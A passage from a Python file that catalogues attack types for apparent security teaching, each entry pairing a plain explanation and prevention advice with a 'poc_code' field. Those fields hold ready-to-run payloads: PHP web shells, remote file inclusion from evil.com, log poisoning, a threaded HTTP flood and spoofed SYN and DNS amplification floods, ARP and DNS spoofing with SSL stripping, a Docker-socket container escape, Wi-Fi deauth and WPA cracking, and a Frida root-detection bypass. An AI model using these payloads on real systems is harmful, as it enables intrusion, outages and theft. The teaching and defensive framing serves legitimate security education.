       prevention="Enforce RBAC/ABAC at server side. Never trust client-side role indicators. Log and alert privilege-sensitive actions. Regular access control audits. Principle of least privilege."),
]

# ── FILE ATTACKS ──────────────────────────────────────────────────────────────
file_attacks = [
  dict(num=11, title="File Upload Vulnerability",
       severity="HIGH",
       definition="File upload vulnerabilities occur when servers don't properly validate uploaded files, allowing execution of malicious scripts leading to Remote Code Execution.",
       simple_explain="A website lets you upload a profile picture. If it doesn't properly check the file, you could upload a PHP script disguised as an image. The server runs your script — you now control the server.",
       example="Image upload checks only file extension (.jpg). Attacker uploads shell.php (renamed shell.jpg). Server saves it. Attacker accesses /uploads/shell.jpg — PHP executes, giving shell access.",
       poc_code="""# Bypass techniques:
# 1. Double extension: shell.php.jpg
# 2. Null byte: shell.php%00.jpg
# 3. Change Content-Type in request:
Content-Type: image/jpeg  (file is actually PHP)
# 4. Case bypass: shell.PhP, shell.PHP5, shell.phtml

# Minimal PHP web shell:
<?php system($_GET['c']); ?>
# Access: /uploads/shell.php?c=id

# Feature-rich web shell:
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}?>

# Check upload with curl:
$ curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload""",
       prevention="Validate magic bytes (not just extension). Rename all uploaded files. Store outside web root. Disable PHP execution in upload dir. Use content delivery network for user files."),

  dict(num=12, title="Path Traversal",
       severity="HIGH",
       definition="Path Traversal (Directory Traversal) allows attackers to access files outside the intended directory by manipulating file path parameters with sequences like ../ to climb directory levels.",
       simple_explain="A website serves files from /var/www/files/. If you ask for ../../etc/passwd, you're navigating UP two directories and requesting the password file. Like taking a wrong turn in a building to reach restricted areas.",
       example="Download URL: /download?file=report.pdf. Attacker tries: /download?file=../../../../etc/passwd. Server fetches /etc/passwd and returns it — full user list exposed.",
       poc_code="""# Basic path traversal:
?file=../../../../etc/passwd
?page=../../windows/win.ini

# URL encoded:
%2e%2e%2f  →  ../
%2e%2e/    →  ../
..%2f      →  ../
%2e%2e%5c  →  ..\

# Double encoding:
%252e%252e%252f  →  (decoded twice) → ../

# Null byte (bypass extension check):
?file=../../../../etc/passwd%00.jpg

# Useful target files:
Linux: /etc/passwd, /etc/shadow, /proc/self/environ,
       ~/.ssh/id_rsa, /var/log/apache2/access.log
Windows: \windows\win.ini, \inetpub\wwwroot\web.config""",
       prevention="Use realpath() to resolve and validate paths. Allowlist permitted directories. Never concatenate user input directly into file paths. Chroot jail for file operations."),

  dict(num=13, title="Local File Inclusion (LFI)",
       severity="HIGH",
       definition="LFI allows an attacker to include files from the local server filesystem in a web page, potentially reading sensitive files or achieving RCE through log poisoning.",
       simple_explain="A PHP page loads: include($_GET['page']). You can make it include /etc/passwd. Even worse — you can poison the server's log file with PHP code, then include the log to execute your code!",
       example="URL: /page.php?lang=en. Attacker tries: /page.php?lang=../../../../etc/passwd. Then poisons Apache log with: User-Agent: <?php system($_GET['c']); ?>. Then includes log → RCE!",
       poc_code="""# Basic LFI:
?page=../../../../etc/passwd
?file=../../../../etc/shadow
?lang=../../../../proc/self/environ

# PHP wrapper abuse:
?page=php://filter/convert.base64-encode/resource=index.php
# Decode base64 output to read source code

?page=php://input  (POST: <?php system('id'); ?>)
?page=data://text/plain,<?php system('id');?>

# Log Poisoning to RCE:
# 1. Poison access log via User-Agent:
$ curl -H "User-Agent: <?php system(\$_GET['c']); ?>" http://target.com/

# 2. Include the log:
?page=../../../../var/log/apache2/access.log&c=id""",
       prevention="Avoid passing user input to include/require. Use whitelist of allowed files. Disable PHP url_include. Set open_basedir restriction. Use absolute paths."),

  dict(num=14, title="Remote File Inclusion (RFI)",
       severity="CRITICAL",
       definition="RFI allows an attacker to include remote files (hosted on their own server) in a web application, leading directly to Remote Code Execution.",
       simple_explain="Like LFI but worse — instead of reading local files, the server downloads and executes YOUR file from YOUR server. You host a PHP backdoor at evil.com/shell.txt, and the victim server runs it!",
       example="include($page . '.php'). Attacker sets page=http://evil.com/shell. Server fetches and executes evil.com/shell.php — full RCE achieved.",
       poc_code="""# RFI Attack:
# 1. Host malicious PHP on attacker server:
# evil.com/shell.txt content:
<?php system($_GET['cmd']); ?>

# 2. Trigger inclusion:
?page=http://evil.com/shell.txt
?page=http://evil.com/shell.txt?   (bypass .php appending)
?page=http://evil.com/shell.txt%00 (null byte bypass)

# 3. Execute commands:
?page=http://evil.com/shell.txt&cmd=id
?page=http://evil.com/shell.txt&cmd=cat+/etc/passwd

# FTP inclusion:
?page=ftp://attacker:pass@evil.com/shell.txt

# Check PHP config for vulnerability:
allow_url_fopen = On   (required)
allow_url_include = On (required)""",
       prevention="Set allow_url_include=Off in php.ini. Set allow_url_fopen=Off. Use allowlist for permitted files. Never pass user input to include(). Upgrade to modern framework."),
]

# ── NETWORK ATTACKS ───────────────────────────────────────────────────────────
network_attacks = [
  dict(num=15, title="Denial of Service (DoS)",
       severity="HIGH",
       definition="DoS attacks flood a target (server, network, service) with more traffic or requests than it can handle, causing legitimate users to be denied access to the service.",
       simple_explain="Imagine 1000 people standing in a shop doorway so real customers can't enter. The shop (server) is still there, but nobody real can get through. That's a DoS — overwhelming the resource.",
       example="Attacker sends millions of HTTP requests per second to bank's login page using a script. Server CPU hits 100%, legitimate customers get 'Service Unavailable'. Bank loses millions per hour of downtime.",
       poc_code="""# HTTP Flood DoS (educational/test own server):
import requests, threading

def flood(target):
    while True:
        try:
            requests.get(target, timeout=1)
        except:
            pass

target = "http://your-own-test-server.com"
for i in range(100):
    threading.Thread(target=flood, args=(target,)).start()

# Slowloris DoS (keeps connections open):
$ pip install slowloris
$ slowloris target.com

# hping3 SYN flood:
$ hping3 -S --flood -V -p 80 target.com

# Layer 7 DoS with wrk:
$ wrk -t12 -c400 -d30s http://target.com""",
       prevention="Rate limiting. CDN/load balancer. WAF rules. Auto-scaling infrastructure. IP blocking. Connection limits per IP. Keep-alive timeouts."),

  dict(num=16, title="Distributed Denial of Service (DDoS)",
       severity="CRITICAL",
       definition="DDoS amplifies DoS using thousands or millions of compromised systems (botnet) to simultaneously attack a target, making it nearly impossible to block or filter.",
       simple_explain="Instead of 1 person blocking a doorway, imagine 1 million people (all controlled by one hacker from a botnet) blocking ALL entrances simultaneously. No matter how big the building — it's overwhelmed.",
       example="Mirai botnet compromised 600,000 IoT devices (cameras, routers). Attacked Dyn DNS in 2016 with 1.2 Tbps — took down Twitter, Netflix, Reddit, GitHub for hours.",
       poc_code="""# DDoS Attack Architecture (educational):
Attacker C2 Server
        │
   ┌────┴────┐
Botnet Bots (thousands of compromised hosts)
   │    │    │
Target ← Coordinated flood from all bots

# Types of DDoS:
1. Volumetric: UDP flood, ICMP flood (consume bandwidth)
2. Protocol:   SYN flood, Ping of Death (consume resources)
3. Application: HTTP flood, Slowloris (exhaust connections)

# Amplification attack (DNS):
# Attacker sends small DNS query with spoofed victim IP
# DNS server sends 70x larger response TO victim
$ hping3 --udp -p 53 --spoof victim_ip dns_server

# Reflection + Amplification = max damage with min effort""",
       prevention="Anycast network diffusion. Traffic scrubbing centres. DDoS protection services (Cloudflare, Akamai). Over-provisioning bandwidth. ISP-level filtering."),

  dict(num=17, title="Man-in-the-Middle (MITM)",
       severity="HIGH",
       definition="MITM attacks intercept communications between two parties, allowing the attacker to eavesdrop, modify data in transit, or inject malicious content without detection.",
       simple_explain="You send a letter to your bank. A spy intercepts it, reads it, possibly changes it, and sends it on. Your bank replies, spy intercepts that too. Neither of you knows the spy exists.",
       example="Attacker on same WiFi uses ARP spoofing to become the 'gateway'. All victim traffic flows through attacker. Victim visits bank site — attacker sees all requests, can inject code, steal passwords.",
       poc_code="""# ARP Spoofing (MITM setup):
# Enable IP forwarding:
$ echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP poison victim and gateway:
$ arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
$ arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Sniff traffic with Wireshark or tcpdump:
$ tcpdump -i eth0 -w capture.pcap

# SSL Strip (downgrade HTTPS to HTTP):
$ sslstrip -l 8080
$ iptables -t nat -A PREROUTING -p tcp --dport 80 \
  -j REDIRECT --to-port 8080

# Ettercap MITM:
$ ettercap -T -q -M arp:remote /victim_ip// /gateway//""",
       prevention="Use HTTPS with HSTS. Certificate pinning. DNSSEC. VPN on public networks. ARP monitoring tools. Network segmentation. Mutual TLS (mTLS)."),

  dict(num=18, title="ARP Spoofing",
       severity="HIGH",
       definition="ARP Spoofing sends fake ARP (Address Resolution Protocol) replies to link the attacker's MAC address with a legitimate IP address, intercepting network traffic on local networks.",
       simple_explain="Your computer uses ARP to ask 'Who has IP 192.168.1.1?' The router answers 'That's my MAC: AA:BB:CC'. An attacker answers FIRST 'That's MY MAC: 11:22:33'. Now your traffic goes to the attacker!",
       example="Home network attack: Attacker sends ARP reply to victim mapping router IP to attacker MAC. Victim's traffic now routes through attacker's machine. Attacker reads all unencrypted data.",
       poc_code="""# ARP Spoofing with arpspoof:
# 1. Find targets:
$ netdiscover -i eth0 -r 192.168.1.0/24

# 2. Identify victim (192.168.1.100) and gateway (192.168.1.1)

# 3. Enable packet forwarding:
$ echo 1 > /proc/sys/net/ipv4/ip_forward

# 4. Send fake ARP replies:
$ arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
# (Tell victim: "Gateway's MAC = attacker's MAC")

$ arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
# (Tell gateway: "Victim's MAC = attacker's MAC")

# 5. Capture traffic:
$ wireshark -i eth0

# Scapy ARP spoof:
from scapy.all import *
send(ARP(op=2, pdst="victim", psrc="gateway",
         hwdst="victim_mac", hwsrc=get_if_hwaddr("eth0")), loop=1)""",
       prevention="Dynamic ARP Inspection (DAI) on switches. Static ARP entries for critical systems. ARP monitoring (arpwatch). Network segmentation. Encrypted communications (HTTPS, VPN)."),

  dict(num=19, title="DNS Spoofing",
       severity="HIGH",
       definition="DNS Spoofing poisons DNS cache with fraudulent entries, redirecting users to attacker-controlled IP addresses when they look up legitimate domain names.",
       simple_explain="DNS is like the internet's phonebook. DNS spoofing is like changing the phonebook so 'bank.com' points to the attacker's IP instead of the real bank. User types the right name but goes to the wrong place.",
       example="Attacker poisons DNS cache at a hotel's router. bank.com now resolves to attacker's IP (209.x.x.x). Guests type bank.com, get a fake bank site, enter credentials — all stolen.",
       poc_code="""# DNS Cache Poisoning concept:
# 1. Send many fake DNS responses to resolver
# Race condition: attacker's response arrives before real server

# dnsspoof (capture and spoof DNS responses):
$ dnsspoof -i eth0 -f hosts.txt
# hosts.txt: 192.168.1.50  bank.com

# Ettercap DNS spoofing plugin:
$ ettercap -T -q -M arp -P dns_spoof /gateway//

# Bettercap:
$ bettercap
> net.probe on
> set dns.spoof.domains bank.com,paypal.com
> set dns.spoof.address 192.168.1.50
> dns.spoof on

# Test DNS poisoning:
$ nslookup bank.com  → Should return attacker IP if success""",
       prevention="Implement DNSSEC. Use encrypted DNS (DoH/DoT). Short TTL on DNS records. Monitor for DNS anomalies. Use reputable DNS resolvers. Deploy HTTPS + HSTS."),
]

# ── API ATTACKS ───────────────────────────────────────────────────────────────
api_attacks = [
  dict(num=20, title="API Injection",
       severity="CRITICAL",
       definition="API Injection attacks target API endpoints with malicious payloads (SQL, NoSQL, command, LDAP) injected through API parameters, headers, or body.",
       simple_explain="APIs are like ordering systems at a restaurant. If the chef (server) doesn't validate your order, you can order things not on the menu — like 'delete all orders' or 'show all customer data'.",
       example="REST API: POST /api/search {'query': 'shoes'}. Attacker sends: {'query': {'$gt': ''}} — NoSQL injection that returns ALL records. Or injects SQL via query param to dump database.",
       poc_code="""# REST API SQL Injection:
GET /api/users?id=1 OR 1=1--
POST /api/search {"name": "'; DROP TABLE users;--"}

# NoSQL Injection (MongoDB):
POST /api/login
{"username": {"$ne": null}, "password": {"$ne": null}}
# Bypasses auth — returns first user!

# GraphQL Injection:
query { user(id: "1 UNION SELECT username,password FROM admin--") }

# API key in URL (bad practice):
GET /api/data?key=abc123  → Stolen from logs, referrer headers

# Mass testing with ffuf:
$ ffuf -u https://api.target.com/v1/FUZZ \
  -w /wordlist/api_endpoints.txt -mc 200

# OWASP API Security test:
$ nuclei -t api/ -u https://target.com/api""",
       prevention="Parameterised queries for all DB operations. Input validation and sanitisation. Rate limiting. API authentication (OAuth2, JWT). Never expose API keys in URLs."),

  dict(num=21, title="BOLA - Broken Object Level Authorisation",
       severity="CRITICAL",
       definition="BOLA (also called IDOR in APIs) is when API endpoints don't verify that the requesting user has permission to access the specific object being requested.",
       simple_explain="An API returns your data at /api/orders/5001. If you request /api/orders/5002 and get someone else's order without any check — that's BOLA. The API doesn't ask 'Does this user OWN this order?'",
       example="Ride-sharing app API: GET /api/trips/8823 returns trip details. All trip IDs are sequential. Attacker iterates from 1 to 100000 — gets all trips, including names, locations, card last-4 of all users.",
       poc_code="""# BOLA Testing with Burp Suite:
1. Log in as User A (user_id=100)
2. Make normal API request:
   GET /api/v1/users/100/account
   Authorization: Bearer tokenA

3. Change user ID to another:
   GET /api/v1/users/101/account
   Authorization: Bearer tokenA  # Still using YOUR token

4. If response returns user 101's data → BOLA confirmed!

# Automated with ffuf:
$ ffuf -u "https://api.target.com/v1/users/FUZZ/profile" \
  -w numbers.txt \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -mc 200

# BOLA in nested objects:
GET /api/companies/50/employees/99
→ Employees of company 50 visible to company 51's users?""",
       prevention="Validate user has access to EVERY object before returning it. Use random UUIDs instead of sequential IDs. Implement object-level authorisation checks in every API handler."),

  dict(num=22, title="Mass Assignment",
       severity="HIGH",
       definition="Mass Assignment occurs when an API automatically binds all user-supplied parameters to internal object properties, allowing attackers to modify fields they shouldn't be able to set (like role, balance, admin flag).",
       simple_explain="A sign-up form has: name, email, password. But the User object also has: role, isAdmin, accountBalance. If the API blindly accepts ALL parameters — you can set role=admin in your registration request!",
       example="POST /api/register {name:'John', email:'j@j.com', pass:'x', role:'admin', isAdmin:true}. App doesn't filter parameters — user John is created with admin privileges.",
       poc_code="""# Mass Assignment Attack:
# Normal registration:
POST /api/register
{"name": "John", "email": "j@j.com", "password": "pass"}

# Mass assignment attack - add extra fields:
POST /api/register
{
  "name": "John",
  "email": "j@j.com",
  "password": "pass",
  "role": "admin",
  "isAdmin": true,
  "balance": 99999,
  "email_verified": true,
  "subscription": "premium"
}

# Test: check if extra params in response:
GET /api/profile → {"role":"admin"} ← Vulnerable!

# Node.js/Express vulnerable code:
app.post('/register', (req, res) => {
    User.create(req.body);  // Binds ALL params!
});""",
       prevention="Use allowlists for accepted fields (DTOs). Never bind request body directly to DB models. Explicitly define which fields users can set. Remove sensitive fields before processing."),
]

# ── CLOUD & INFRA ─────────────────────────────────────────────────────────────
cloud_attacks = [
  dict(num=23, title="SSRF (Server-Side Request Forgery)",
       severity="CRITICAL",
       definition="SSRF tricks the server into making HTTP requests to internal resources on behalf of the attacker, bypassing firewalls and accessing internal services not exposed to the internet.",
       simple_explain="You tell a website 'fetch this image: http://internal-server/secret'. The server fetches it from inside the network (where your firewall doesn't protect) and returns it to you. The server becomes your proxy inside.",
       example="Image downloader: POST /fetch {'url':'http://169.254.169.254/latest/meta-data/iam/security-credentials/role'}. Server fetches AWS metadata and returns cloud credentials — attacker takes over the cloud account!",
       poc_code="""# Basic SSRF:
POST /api/fetch
{"url": "http://localhost/admin"}
{"url": "http://127.0.0.1:8080/internal"}
{"url": "http://192.168.1.1/router-admin"}

# AWS Metadata (Classic):
{"url": "http://169.254.169.254/latest/meta-data/"}
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"}

# SSRF Bypass techniques:
http://127.0.0.1     → http://0x7f000001 (hex)
http://localhost     → http://[::1] (IPv6)
http://127.1         → http://2130706433 (decimal)
http://spoofed.attacker.com → resolves to 127.0.0.1

# Internal port scanning via SSRF:
{"url": "http://192.168.1.1:22"}   → SSH open?
{"url": "http://192.168.1.1:3306"} → MySQL?""",
       prevention="Allowlist permitted URLs/domains. Block private IP ranges (127.x, 10.x, 192.168.x, 169.254.x). Resolve DNS before allowlist check. Disable unused URL schemas (file://, dict://)."),

  dict(num=24, title="Security Misconfiguration",
       severity="HIGH",
       definition="Security misconfiguration is the most common vulnerability — default credentials, open cloud buckets, directory listing, verbose error messages, unnecessary services left enabled.",
       simple_explain="Leaving the front door key under the mat. Default admin:admin credentials, public S3 buckets with sensitive files, debug mode on in production — all examples of misconfiguration attackers love.",
       example="AWS S3 bucket set to public read: s3://company-backups/employees.csv — contains 50,000 employee records with SSN, salary. Bucket was configured 'public' by mistake. All data exposed.",
       poc_code="""# Common misconfigurations to check:
# 1. Default credentials:
admin:admin, admin:password, root:root, admin:123456

# 2. Directory listing enabled:
GET /backup/  → lists all files!

# 3. S3 bucket enumeration:
$ aws s3 ls s3://company-backup --no-sign-request
$ gobuster s3 --wordlist buckets.txt

# 4. Exposed .env files:
GET /.env → DB_PASSWORD=secret123!

# 5. Debug mode information disclosure:
# Error: SQL query failed: SELECT * FROM users WHERE id=1
# Stack trace reveals: /var/www/html/models/User.php:45

# 6. Open admin panels:
/admin, /phpmyadmin, /wp-admin, /manager/html (Tomcat)
/.git/ exposed → download entire source code
/swagger-ui  → full API documentation exposed""",
       prevention="Automated configuration scanning. Disable default accounts. Enable least privilege. Remove debug modes in production. Regular security audits. IaC security scanning."),

  dict(num=25, title="Container Escape",
       severity="CRITICAL",
       definition="Container escape exploits vulnerabilities in container runtime, misconfigured containers, or kernel vulnerabilities to break out of a Docker/Kubernetes container and access the host OS.",
       simple_explain="A container is like a prison cell for code. Container escape is jailbreaking — finding a way out of the cell to access the main system. Once out, attacker controls ALL containers and the host.",
       example="Docker container run with --privileged flag. Attacker mounts host filesystem from inside container: mount /dev/sda1 /mnt. Now has full access to host disk — reads /etc/shadow, installs persistence.",
       poc_code="""# Check if running in privileged container:
$ cat /proc/self/status | grep CapEff
# If: 0000003fffffffff → PRIVILEGED = container escape possible!

# Mount host filesystem (privileged container):
$ fdisk -l     # list host disks
$ mkdir /mnt/host
$ mount /dev/sda1 /mnt/host
$ chroot /mnt/host bash    # NOW ON HOST!

# Docker socket escape (if /var/run/docker.sock mounted):
$ docker -H unix:///var/run/docker.sock run -it \
  --privileged --pid=host -v /:/host ubuntu \
  chroot /host bash   # Host shell!

# CVE-2019-5736 (runc overwrite):
# Overwrites host runc binary from within container

# Kubernetes privilege escalation:
$ kubectl get serviceaccounts
$ kubectl auth can-i --list   # check permissions""",
       prevention="Never use --privileged flag. Don't mount Docker socket. Use read-only filesystems. Implement seccomp profiles. Pod Security Standards (Kubernetes). Runtime security monitoring (Falco)."),
]

# ── WIRELESS ──────────────────────────────────────────────────────────────────
wireless_attacks = [
  dict(num=1, title="Evil Twin Attack",
       severity="HIGH",
       definition="An Evil Twin creates a rogue WiFi access point that mimics a legitimate network. Victims connect thinking it's the real network, while attacker intercepts all their traffic.",
       simple_explain="You see 'CoffeeShop_WiFi' and connect. But there are TWO networks with that name — the real one and the hacker's fake one. If you connect to the fake one, all your data goes through the hacker.",
       example="Attacker sets up hotspot named 'Starbucks_WiFi' with stronger signal than the real Starbucks WiFi. Victims auto-connect. Attacker runs sslstrip — captures login credentials for all sites visited.",
       poc_code="""# Evil Twin setup with hostapd-wpe:
# 1. Install tools:
$ apt install hostapd-wpe dnsmasq

# 2. Configure fake AP (hostapd.conf):
interface=wlan0
driver=nl80211
ssid=TargetNetwork     # Same SSRF as target
channel=6
hw_mode=g

# 3. DHCP server (dnsmasq.conf):
interface=wlan0
dhcp-range=192.168.1.2,192.168.1.254,12h
dhcp-option=3,192.168.1.1    # Gateway
dhcp-option=6,192.168.1.1    # DNS

# 4. Start services:
$ hostapd hostapd.conf &
$ dnsmasq -C dnsmasq.conf &

# 5. Capture traffic:
$ tcpdump -i wlan0 -w evil_twin_capture.pcap

# airbase-ng alternative:
$ airbase-ng -e "TargetSSID" -c 6 wlan0mon""",
       prevention="Always verify WiFi certificates (Enterprise WPA). Use VPN on all public WiFi. Check for multiple SSIDs. Disable auto-connect. HTTPS-only browsing. 802.1X authentication."),

  dict(num=2, title="WPA/WPA2 Cracking",
       severity="HIGH",
       definition="WPA/WPA2 cracking captures the 4-way handshake when a client connects to a network, then uses offline dictionary or brute-force attacks to recover the WiFi password.",
       simple_explain="WPA handshake is like a secret greeting between your phone and router. Capture that greeting, and you can try millions of passwords offline to find which one produces the same greeting. Like recording a secret knock.",
       example="Attacker captures 4-way handshake from home network using aircrack-ng. Runs captured handshake against rockyou.txt wordlist — finds password 'Sarah2023!' in 4 minutes.",
       poc_code="""# WPA2 Cracking with aircrack-ng:
# 1. Enable monitor mode:
$ airmon-ng start wlan0   → wlan0mon

# 2. Scan networks:
$ airodump-ng wlan0mon
# Note: BSSID (router MAC) and Channel

# 3. Capture handshake:
$ airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
  -w capture wlan0mon

# 4. Deauth to force reconnect (capture handshake):
$ aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Crack with wordlist:
$ aircrack-ng capture-01.cap \
  -w /usr/share/wordlists/rockyou.txt

# GPU cracking with hashcat:
$ aircrack-ng capture-01.cap -j hash
$ hashcat -m 22000 hash.hc22000 rockyou.txt""",
       prevention="Use WPA3. Long random passwords (20+ chars). Disable WPS (PIN brute-forceable). Update router firmware. Use enterprise WiFi (802.1X). Regular password rotation."),

  dict(num=3, title="Deauthentication Attack",
       severity="MEDIUM",
       definition="A deauthentication (deauth) attack sends spoofed 802.11 deauthentication frames, forcibly disconnecting clients from a WiFi network. Used for DoS or forcing reconnections to capture handshakes.",
       simple_explain="WiFi has a 'kick out' management signal. These signals are NOT authenticated — anyone can send them! An attacker repeatedly sends 'disconnect' commands, kicking you off WiFi repeatedly.",
       example="Attacker runs deauth attack against a gaming tournament. All players' WiFi connections drop every few seconds. Attacker simultaneously runs evil twin — players reconnect to attacker's AP.",
       poc_code="""# Deauth attack with aireplay-ng:
# 1. Enable monitor mode:
$ airmon-ng start wlan0

# 2. Find targets:
$ airodump-ng wlan0mon
# BSSID: Router MAC, STATION: Client MAC

# 3. Deauth all clients from network:
$ aireplay-ng -0 0 -a ROUTER_MAC wlan0mon
# -0 = deauth, 0 = infinite, -a = target AP

# 4. Deauth specific client:
$ aireplay-ng -0 10 -a ROUTER_MAC -c CLIENT_MAC wlan0mon
# -c = specific client

# MDK3 (mass deauth):
$ mdk3 wlan0mon d -b blacklist.txt

# Detection:
# Wireshark filter: wlan.fc.type_subtype == 0x000c
# Many deauth frames = attack in progress""",
       prevention="Use WPA3 (Management Frame Protection - MFP/802.11w). Upgrade to 6GHz WiFi (less susceptible). Use wired connections for critical systems. WIDS (Wireless Intrusion Detection)."),

  dict(num=4, title="Bluetooth Attacks",
       severity="MEDIUM",
       sub_attacks=["Bluejacking","Bluesnarfing","BlueBorne","BIAS"],
       definition="Bluetooth attacks exploit vulnerabilities in the Bluetooth protocol stack to discover devices, steal data, or execute code without user interaction.",
       simple_explain="Bluetooth is a short-range radio signal. Attackers can discover your device, pair without permission (bluesnarfing), or exploit bugs to steal contacts and messages — just by being nearby.",
       example="BlueBorne (2017): Critical vulnerability in Android/iOS Bluetooth stack. Attacker within Bluetooth range can silently take over device with NO user interaction required — without even pairing.",
       poc_code="""# Bluetooth device discovery:
$ hciconfig hci0 up
$ hcitool scan       # classic BT scan
$ hcitool lescan     # BLE scan

# Bluejacking (send unsolicited messages):
$ hcitool scan → get target address
$ echo "Hello from nearby!" | sdptool browse TARGET_MAC

# Bluesnarfing (steal contacts - older devices):
$ bluesnarfer -r 1-100 -b TARGET_MAC

# BlueBorne CVE-2017-0781 (Android):
# Check: bluetoothctl paired-devices
# Device in discoverable mode = vulnerable

# BLE Reconnaissance:
$ gatttool -b TARGET_MAC --primary
$ gatttool -b TARGET_MAC --char-read -a 0x0003

# BTLE-Sniffer:
$ btlejack -d /dev/ttyACM0 --sniff TARGET_MAC""",
       prevention="Disable Bluetooth when not in use. Set to non-discoverable. Keep OS updated (BlueBorne patched in security updates). Don't accept unknown pairing requests. Use BT 5.0+ with better security."),
]

# ── MOBILE ATTACKS ────────────────────────────────────────────────────────────
mobile_attacks = [
  dict(num=1, title="APK Reverse Engineering",
       severity="HIGH",
       definition="APK reverse engineering decompiles Android applications to extract source code, hardcoded secrets, API endpoints, and business logic for further exploitation.",
       simple_explain="An APK is a zip file with compiled code. Reverse engineering is like having a machine that converts your built IKEA furniture back into the instructions and parts — attackers do this to read the app's secrets.",
       example="Security researcher reverse engineers banking app. Finds hardcoded API endpoint /api/v1/admin and Base64-encoded admin API key in strings.xml. Uses key to access admin API and dump user data.",
       poc_code="""# APK Reverse Engineering Tools:

# 1. JADX (best Java decompiler):
$ jadx -d output/ target.apk
$ jadx-gui target.apk   # GUI version

# 2. apktool (resources + manifest):
$ apktool d target.apk -o decompiled/
$ ls decompiled/res/values/strings.xml  # hardcoded secrets!

# 3. Search for sensitive data:
$ grep -r "api_key\|password\|secret\|token\|AWS" decompiled/
$ grep -r "http://\|https://" decompiled/   # endpoints

# 4. dex2jar + JD-GUI:
$ d2j-dex2jar.sh target.apk
$ java -jar jd-gui.jar target-dex2jar.jar

# 5. MobSF (automated analysis):
$ docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
# Upload APK → full security report""",
       prevention="Code obfuscation (ProGuard/R8). Don't hardcode secrets — use secure storage or remote config. Certificate pinning. Runtime detection of tampering. Encrypt sensitive strings."),

  dict(num=2, title="Hardcoded Secrets/Keys",
       severity="CRITICAL",
       definition="Hardcoded secrets are sensitive values (API keys, passwords, encryption keys, tokens) embedded directly in source code or compiled binaries, easily extractable by reverse engineering.",
       simple_explain="Writing your safe combination on a sticky note inside the safe. When someone opens the safe (reverse engineers the app), they immediately find the combination (API key/password) written there.",
       example="Firebase API key hardcoded in Android app strings.xml. App downloaded from Play Store → APK reverse engineered → API key found → attacker accesses Firebase database, reads all user data.",
       poc_code="""# Finding hardcoded secrets:

# Strings extraction from APK:
$ strings target.apk | grep -i "key\|token\|secret\|pass"

# After JADX decompile:
$ grep -r "private static final String" output/sources/
$ grep -rE "[A-Za-z0-9+/]{40,}={0,2}" output/  # Base64 keys
$ grep -rE "AKIA[A-Z0-9]{16}" output/  # AWS Access Key pattern

# Common locations:
- res/values/strings.xml
- assets/config.json
- BuildConfig.java
- SharedPreferences files
- local.properties (should be in .gitignore!)

# Validate found AWS key:
$ aws sts get-caller-identity --access-key FOUND_KEY \
  --secret-key FOUND_SECRET

# GitHub secret scanning:
$ trufflehog git https://github.com/target/repo""",
       prevention="Use Android Keystore for keys. Remote configuration (Firebase Remote Config). Environment variables. Secret scanning in CI/CD (GitHub secret scanning, truffleHog). Never commit secrets to git."),

  dict(num=3, title="Insecure Data Storage",
       severity="HIGH",
       definition="Insecure data storage occurs when mobile apps store sensitive data (passwords, tokens, PII) in unprotected locations like SharedPreferences, SQLite without encryption, or external storage.",
       simple_explain="App saves your password in a plain text file on the phone. Any app with storage permission, or anyone with physical access, can read that file. Like leaving your diary unlocked in a public library.",
       example="Banking app stores session token in SharedPreferences (XML file). On rooted device, any app can read /data/data/com.bank.app/shared_prefs/prefs.xml — token found, account takeover possible.",
       poc_code="""# Check insecure data storage (on rooted/ADB device):

# SharedPreferences:
$ adb shell
$ run-as com.target.app
$ cat shared_prefs/*.xml | grep -i "token\|pass\|secret"

# SQLite databases:
$ ls databases/
$ sqlite3 databases/app.db
> .tables
> SELECT * FROM users;

# External storage (world-readable):
$ ls /sdcard/Android/data/com.target.app/

# Check Android logs:
$ adb logcat | grep -i "password\|token\|secret"

# iOS equivalent:
$ ssh root@device
$ find /var/mobile/Containers/ -name "*.plist"
$ cat TrustStore.sqlite3   # certificates

# Frida to hook storage calls:
$ frida -U -n "TargetApp" -e "Interceptor.attach(
  Module.findExportByName(null,'sqlite3_exec'), {...})"
""",
       prevention="Use Android Keystore for sensitive data. Encrypt SQLite databases (SQLCipher). Never store sensitive data on external storage. Use EncryptedSharedPreferences (AndroidX Security)."),

  dict(num=4, title="Root Detection Bypass",
       severity="MEDIUM",
       definition="Many security-sensitive apps detect rooted/jailbroken devices and refuse to run. Root detection bypass techniques circumvent these checks to run the app with full system access.",
       simple_explain="Banking apps check 'Is this phone rooted?' If yes, they won't run. Attackers use tools like Magisk or Frida to hide the fact that the phone is rooted — tricking the app into thinking it's safe.",
       example="Banking app checks for su binary and SafetyNet attestation. Attacker uses Magisk Hide — su is hidden from app. SafetyNet bypassed with Magisk module. App runs on rooted device, attacker captures all API calls.",
       poc_code="""# Root Detection Methods apps use:
1. Check for /su, /system/xbin/su
2. SafetyNet Attestation API
3. Check for Magisk Manager package
4. Frida server detection (port 27042)
5. ro.build.tags == "test-keys"

# Bypass Methods:

# 1. Magisk Hide (hide root from specific apps):
Magisk → Settings → Configure DenyList → Add target app

# 2. Frida root bypass script:
Java.perform(function() {
    var RootCheck = Java.use("com.target.RootDetection");
    RootCheck.isRooted.implementation = function() {
        return false;  // Always return "not rooted"
    };
});
$ frida -U -n "TargetApp" -s bypass_root.js

# 3. Patch APK with apktool:
$ apktool d target.apk
# Find root check code, change result
# smali: const/4 v0, 0x1 → const/4 v0, 0x0 (true→false)
$ apktool b target -o patched.apk""",
       prevention="Multiple root detection layers. SafetyNet/Play Integrity API. Native code checks (harder to hook). Server-side validation. Runtime Application Self-Protection (RASP). Obfuscation."),
]

# ── THICK CLIENT ──────────────────────────────────────────────────────────────
thick_attacks = [
  dict(num=1, title="DLL Injection",
       severity="HIGH",
       definition="DLL Injection forces a running process to load a malicious Dynamic Link Library (DLL), executing attacker-controlled code within the address space of a legitimate process.",
